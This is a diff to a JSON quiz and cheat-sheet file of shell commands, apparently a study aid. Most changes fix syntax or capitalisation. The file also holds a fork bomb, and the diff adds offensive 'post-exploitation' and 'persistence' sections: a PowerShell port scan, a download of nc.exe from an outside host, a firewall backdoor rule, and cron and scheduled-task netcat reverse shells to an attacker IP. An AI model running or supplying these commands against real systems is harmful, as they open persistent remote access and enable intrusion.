@@ -393,13 +393,13 @@
             "answer": ":(){:|: &};:"
         }, {
             "question": "How would one do a ping sweep for the 192.168.0.1/24 network?",
-            "answer": "for x in {1..254..1};do ping -c 192.168.0.$x"
+            "answer": "for x in {1..254..1};do ping -c 1 192.168.0.$x"
         }],
         "commands": [{
             "command": ":(){:|: &};:",
             "comment": "Fork Bomb"
         }, {
-            "command": "for x in {1..254..1};do ping -c 1.1.1.$x",
+            "command": "for x in {1..254..1};do ping -c 1 1.1.1.$x",
             "comment": "Ping Sweep"
         }],
         "tags": [{
@@ -779,9 +779,6 @@
             "question": "How do you find the string \"hello\" in the file test.txt in Windows using CMD?",
             "answer": "find /I \"hello\" test.txt"
         }, {
-            "question": "How do you schedule the command 'cmd /c' to run at 6 am in Windows using CMD?",
-            "answer": "at 06:00 cmd /c"
-        }, {
             "question": "How do you run 'cmd /c' as the user tyler in Windows via CMD?",
             "answer": "runas /user:tyler \"cmd /c\""
         }, {
@@ -800,9 +797,6 @@
         }, {
             "command": "<command> | find /c /v \"\"",
             "comment": "Line count of <cmd> output"
-        }, {
-            "command": "at HH:MM <file> [args]",
-            "comment": "Schedule <file> to run. (ie. at 14:20 cmd /c)"
         }, {
             "command": "runas /user:<USER> \"<file> [args]\"",
             "comment": "Run <file> as <USER>"
@@ -870,10 +864,10 @@
         "name": "windows/powershell/basic",
         "questions": [{
             "question": "Search for Powershell commands with keyword 'domain'",
-            "answer": "get-command *domain*"
+            "answer": "Get-Command *domain*"
         }, {
             "question": "How do you display services using Windows Powershell?",
-            "answer": "get-service"
+            "answer": "Get-Service"
         }, {
             "question": "How do you display powershell version?",
             "answer": "$PSVersionTable"
@@ -882,7 +876,7 @@
             "answer": "powershell.exe -version 2.0"
         }, {
             "question": "How do you list processes (name only) in Windows Powershell?",
-            "answer": "get-process | select -expandproperty name"
+            "answer": "Get-Process | select -expandproperty name"
         }, {
             "question": "How do you get a list of drives in Powershell?",
             "answer": "get-psdrive"
@@ -909,7 +903,7 @@
             "command": "powershell.exe -version 2.0",
             "comment": "Open powershell version 2 (from other ps versions)"
         }, {
-            "command": "get-process | select -expandproperty name",
+            "command": "Get-Process | select -expandproperty name",
             "comment": "Get processes (names only)"
         }, {
             "command": "get-psdrive",
@@ -1286,6 +1280,87 @@
         }, {
             "command": "keybase pgp verify -d foo.txt.asc -i foo.txt",
             "comment": "PGP verify file + detatched signature"
+        }],
+        "tags": [],
+        "platform": ""
+    }, {
+        "name": "windows/powershell/post-exploitation",
+        "questions": [{
+            "question": "Do a ping sweep of the network 10.10.10.0/24 in Powershell.",
+            "answer": "1..255 | % {echo \"10.10.10.$_\"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}"
+        }, {
+            "question": "How would you port scan the address 1.2.3.4 using only Powershell?",
+            "answer": "1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"1.2.3.4\", $_)) \"Port $_ is open\"} 2>$null"
+        }, {
+            "question": "How would you fetch the file nc.exe from address 1.2.3.4 using only Powershell?",
+            "answer": "(New-Object System.Net.WebClient).DownloadFile(\"http://1.2.3.4/nc.exe\", \"nc.exe\")"
+        }, {
+            "question": "List hotfixes in Windows using Powershell.",
+            "answer": "Get-HotFix"
+        }, {
+            "question": "List programs set to start automatically in Windows using Powershell.",
+            "answer": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run"
+        }, {
+            "question": "Convert the string \"hello\" from ASCII to Base64 in Powershell.",
+            "answer": "[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"hello\"))"
+        }, {
+            "question": "How do you get all the Windows Firewall rules using only Powershell?",
+            "answer": "Get-NetFirewallRule -all"
+        }, {
+            "question": "Allow address 1.2.3.4 inbound in the firewall using Powershell. Name the rule 'LetMeIn'",
+            "answer": "New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 1.2.3.4"
+        }],
+        "commands": [{
+            "command": "1.255 | % {echo \"10.10.10.$_; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}",
+            "comment": "Ping sweep"
+        }, {
+            "command": "1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(\"10.10.10.10\", $_)) \"Port $_ is open!\"} 2>$null",
+            "comment": "Port scan"
+        }, {
+            "command": "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/nc.exe\", \"nc.exe\")",
+            "comment": "Fetch a file via HTTP (like wget)"
+        }, {
+            "command": "Get-HotFix",
+            "comment": "Get a list of Microsoft Hotfixes"
+        }, {
+            "command": "cd HKLM:\\",
+            "comment": "Navigate to Windows registry"
+        }, {
+            "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run",
+            "comment": "List programs set to start automatically in the registry"
+        }, {
+            "command": "[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"PS for the win!\"))",
+            "comment": "Convert string form ASCII to Base64"
+        }, {
+            "command": "Get-NetFirewallRule -all",
+            "comment": "Get Firewall rules"
+        }, {
+            "command": "New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25",
+            "comment": "Create/modify a rule"
+        }],
+        "tags": [],
+        "platform": ""
+    }, {
+        "name": "linux/hack/persistence",
+        "questions": [{
+            "question": "Add 10 minute callback to attacker at 1.2.3.4 on port 777 using bash in Linux.",
+            "answer": "echo \"0-59/10 * * * * nc 1.2.3.4 777 -e /bin/bash\" >> /etc/crontab"
+        }],
+        "commands": [{
+            "command": "0-59/10 * * * * nc <IP> 777 -e /bin/bash",
+            "comment": "Crontab - set to callback to attacker's IP every 10 minutes with bash via netcat (to reassure)"
+        }],
+        "tags": [],
+        "platform": ""
+    }, {
+        "name": "windows/hack/persistence",
+        "questions": [{
+            "question": "Create a scheduled task to throw a callback shell to 1.2.3.4 on port 777 every hour in CMD and Powershell",
+            "answer": "SCHTASKS /Create /SC Hourly /TN hacked /TR \"nc 1.2.3.4 777 -e cmd.exe\""
+        }],
+        "commands": [{
+            "command": "nc <IP> <PORT> -e cmd.exe",
+            "comment": "Netcat Callback/reverse shell. Run on victim's machine"
         }],
         "tags": [],
         "platform": ""
